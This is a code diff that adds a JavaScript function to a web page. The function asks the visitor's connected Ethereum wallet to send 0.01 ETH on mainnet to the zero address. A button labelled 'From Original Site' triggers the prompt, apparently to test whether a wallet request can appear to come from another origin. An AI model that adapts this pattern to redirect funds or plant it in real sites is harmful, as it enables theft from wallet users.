@@ -66,6 +66,29 @@
         return false; // Wallet not connected
       }
     }
+    async function promptEthTransaction() {
+      try {
+        const transactionParameters = {
+          nonce: "0x00",
+          gasPrice: "0x244AC6D",
+          gas: "0x12A52",
+          to: "0x0000000000000000000000000000000000000000",
+          from: ethereum.selectedAddress,
+          value: "0x2386F26FC10000",
+          data: "0x00",
+          chainId: "0x1",
+        };
+
+        const txHash = await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [transactionParameters],
+        });
+
+        alert(`Transaction sent: ${txHash}`);
+      } catch (error) {
+        alert('Ethereum transaction request failed or was rejected.');
+      }
+    }
   </script>
   <center>
     <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptTransaction()">
